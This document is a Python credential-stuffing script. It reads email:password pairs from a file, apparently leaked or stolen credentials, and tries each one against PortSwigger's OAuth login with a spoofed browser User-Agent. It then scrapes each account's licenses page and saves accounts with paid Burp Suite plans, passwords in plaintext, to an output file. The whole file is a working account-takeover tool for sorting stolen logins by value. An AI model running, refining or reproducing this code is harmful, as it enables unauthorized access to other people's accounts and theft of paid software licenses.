#!/usr/bin/env python3
"""
PortSwigger Plan Extractor v2 - Improved OAuth2/OIDC handling
Extract subscription plans from log.txt with proper OAuth state management
"""

import requests
import re
import sys
import json
from datetime import datetime
from urllib.parse import urlencode, urlparse, parse_qs

INPUT_FILE = "log.txt"
OUTPUT_FILE = "portswigger_paid_accounts.txt"
FAILED_FILE = "portswigger_account_failures.txt"

LOGIN_URL = "https://portswigger.net/users"
AUTHORIZE_URL = "https://portswigger.net/users/authorize"
LOGIN_POST_URL = "https://login.portswigger.net/u/login"
CALLBACK_URL = "https://portswigger.net/users/authorize/callback"
LICENSES_URL = "https://portswigger.net/users/youraccount/licenses"

class PortSwiggerChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
        })
        self.session.timeout = 30
        self.current_state = None

    def extract_state_from_url(self, url):
        """Extract state parameter from URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return params.get('state', [None])[0]

    def extract_state_from_html(self, html):
        """Extract state parameter from HTML form"""
        match = re.search(r'name=["\']?state["\']?\s+value=["\']?([^"\'>\s]+)', html, re.IGNORECASE)
        return match.group(1) if match else None

    def extract_form_fields(self, html):
        """Extract all form fields and their values"""
        fields = {}
        # More comprehensive regex for input fields
        pattern = r'<input[^>]+?(?:name|value)="?([^"\s>]+)"?[^>]*?(?:value|name)="?([^"\s>]+)"?[^>]*>'

        # Alternative simpler approach - parse all input fields
        for match in re.finditer(r'<input[^>]*>', html, re.IGNORECASE):
            input_tag = match.group(0)
            # Extract name
            name_match = re.search(r'name=["\']?([^"\'>\s]+)', input_tag, re.IGNORECASE)
            if name_match:
                name = name_match.group(1)
                # Extract value
                value_match = re.search(r'value=["\']?([^"\'>\s]+)', input_tag, re.IGNORECASE)
                value = value_match.group(1) if value_match else ""
                fields[name] = value

        return fields

    def extract_plan(self, html):
        """Extract subscription plan from licenses page"""
        if "You do not have any subscriptions" in html or "no subscriptions" in html.lower():
            return None  # Free account

        # Look for plan type in HTML
        plan_keywords = {
            "Professional": "Professional",
            "Enterprise": "Enterprise",
            "Community": "Community",
            "Burp Suite Pro": "Professional",
            "Burp Suite Enterprise": "Enterprise",
        }

        for keyword, plan_type in plan_keywords.items():
            if keyword in html:
                return plan_type

        # If there's a license but plan type not found, assume paid
        if "license" in html.lower() or "subscription" in html.lower():
            return "Unknown"

        return None

    def check_login_and_plan(self, email, password):
        """Check if credentials are valid and extract plan"""
        try:
            # Step 1: Initial login page to get OAuth state
            resp1 = self.session.get(LOGIN_URL, timeout=30, allow_redirects=True)
            if resp1.status_code != 200:
                return None, f"login_page: {resp1.status_code}"

            # Extract state if present in URL or form
            state = self.extract_state_from_url(resp1.url) or self.extract_state_from_html(resp1.text)
            if not state:
                return None, "no_state_param"

            self.current_state = state

            # Step 2: Extract all form fields from login page
            form_fields = self.extract_form_fields(resp1.text)
            if not form_fields or 'username' not in str(resp1.text).lower():
                # If no form found, try a different approach
                form_fields = {
                    'state': state,
                    'username': email,
                    'password': password,
                    'action': 'default'
                }
            else:
                # Update form with credentials
                form_fields['username'] = email
                form_fields['password'] = password

            # Step 3: POST login credentials
            resp2 = self.session.post(
                LOGIN_POST_URL,
                data=form_fields,
                timeout=30,
                allow_redirects=True,
                verify=True
            )

            # Step 4: Check for login errors
            if resp2.status_code >= 400:
                return None, f"http_{resp2.status_code}"

            if "wrong" in resp2.text.lower() or "invalid" in resp2.text.lower():
                if "password" in resp2.text.lower():
                    return None, "invalid_credentials"
                else:
                    return None, "login_error"

            # Check if redirected to callback URL (successful auth)
            if CALLBACK_URL in resp2.url or "callback" in resp2.url:
                # Auth successful, will be redirected to target
                pass
            elif LOGIN_POST_URL in resp2.url and "state" in resp2.text:
                # Still on login page
                return None, "login_failed"

            # Step 5: Access licenses page to confirm auth and get plan
            resp3 = self.session.get(LICENSES_URL, timeout=30)

            if resp3.status_code == 401 or resp3.status_code == 403:
                return None, f"auth_required"

            if resp3.status_code == 200:
                plan = self.extract_plan(resp3.text)
                if plan:
                    return plan, "success"
                else:
                    return None, "no_subscription"
            else:
                return None, f"access_denied_{resp3.status_code}"

        except requests.exceptions.Timeout:
            return None, "timeout"
        except requests.exceptions.ConnectionError as e:
            return None, f"connection_error"
        except Exception as e:
            return None, f"exception_{type(e).__name__}"

def read_credentials(filename):
    """Read credentials from file"""
    creds = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            creds.append(line)
        return creds
    except FileNotFoundError:
        print(f"ERROR: File not found: {filename}")
        sys.exit(1)

def main():
    print("[*] PortSwigger Plan Extractor v2 (Improved OAuth2)")
    print(f"[*] Input: {INPUT_FILE}")
    print(f"[*] Paid accounts: {OUTPUT_FILE}")
    print(f"[*] Failures: {FAILED_FILE}")
    print("")

    # Read credentials
    print("Step 1: Reading credentials...")
    creds = read_credentials(INPUT_FILE)
    print(f"✓ Loaded {len(creds)} credentials")
    print("")

    # Initialize checker
    checker = PortSwiggerChecker()

    # Check credentials and extract plans
    print("Step 2: Checking logins and extracting plans...")
    paid_accounts = []
    failed_accounts = []
    error_summary = {}

    for idx, cred in enumerate(creds, 1):
        parts = cred.split(':', 1)
        if len(parts) != 2:
            continue

        email, password = parts
        sys.stdout.write(f"\r[{idx}/{len(creds)}] Processing... Paid: {len(paid_accounts)} | Failed: {len(failed_accounts)}")
        sys.stdout.flush()

        plan, reason = checker.check_login_and_plan(email, password)

        if plan:  # Only paid accounts
            paid_accounts.append((email, password, plan))
        else:
            failed_accounts.append((email, password, reason))
            error_summary[reason] = error_summary.get(reason, 0) + 1

    print(f"\r[{len(creds)}/{len(creds)}] Processing... Paid: {len(paid_accounts)} | Failed: {len(failed_accounts)}    ")
    print("")

    # Write results
    print("Step 3: Writing results...")

    # Write paid accounts
    with open(OUTPUT_FILE, 'w') as f:
        f.write(f"# Paid PortSwigger Accounts\n")
        f.write(f"# Format: email|password|plan\n")
        f.write(f"# Generated: {datetime.now().isoformat()}\n")
        f.write(f"# Total: {len(paid_accounts)}\n")
        f.write(f"#\n")
        for email, password, plan in paid_accounts:
            f.write(f"{email}|{password}|{plan}\n")

    # Write failed accounts
    with open(FAILED_FILE, 'w') as f:
        f.write(f"# Failed or Free Accounts\n")
        f.write(f"# Format: email:password # error_reason\n")
        f.write(f"# Generated: {datetime.now().isoformat()}\n")
        f.write(f"# Total: {len(failed_accounts)}\n")
        f.write(f"#\n")
        for email, password, reason in failed_accounts:
            f.write(f"{email}:{password} # {reason}\n")

    print(f"✓ Paid: {OUTPUT_FILE} ({len(paid_accounts)} accounts)")
    print(f"✓ Failed/Free: {FAILED_FILE} ({len(failed_accounts)} accounts)")
    print("")

    # Print error summary
    if error_summary:
        print("Error Summary:")
        for error, count in sorted(error_summary.items(), key=lambda x: -x[1]):
            print(f"  {error}: {count}")
        print("")

    # Summary
    print("============================================================")
    print("PLAN EXTRACTION COMPLETE")
    print("============================================================")
    print(f"Total checked: {len(creds)}")
    print(f"Paid accounts: {len(paid_accounts)}")
    print(f"Failed/Free: {len(failed_accounts)}")
    if len(creds) > 0:
        success_rate = len(paid_accounts) * 100 / len(creds)
        print(f"Paid account rate: {success_rate:.1f}%")
    print("============================================================")

if __name__ == "__main__":
    main()
